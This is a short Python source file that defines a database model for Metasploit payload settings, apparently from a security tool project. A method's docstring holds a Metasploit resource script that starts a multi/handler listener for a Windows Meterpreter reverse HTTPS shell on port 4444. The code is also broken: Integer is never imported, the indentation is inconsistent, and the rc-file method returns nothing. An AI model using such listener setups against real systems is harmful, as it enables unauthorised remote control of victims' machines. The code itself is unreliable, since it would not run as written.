# -*- coding: utf-8 -*-
'''
Created on Mar 12, 2012

@author: moloch
'''


from models import dbsession
from sqlalchemy import Column, ForeignKey
from sqlalchemy.types import String
from models.BaseObject import BaseObject


class Payload(BaseObject):
	''' Payload settings '''

    user_id = Column(Integer, 
        ForeignKey('user.id'), 
        nullable=False
    )
    lport = Column(Integer, default=4444)
    lhost = Column(String(32), default="0.0.0.0")
    rport = Column(Integer, default=4444)
    rhost = Column(String(32))
    msfpayload = Column(String(64))
    msfoptions = Column(String(64))
    download_url = Column(String(64))
    protocol = Column(String(64))

    @classmethod
    def by_id(cls, sid):
        return dbsession.query(cls).filter_by(id=sid).first()

    def generate_rc_file(self):
    	'''
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
'''

    def __str__(self):
    	return self.msfpayload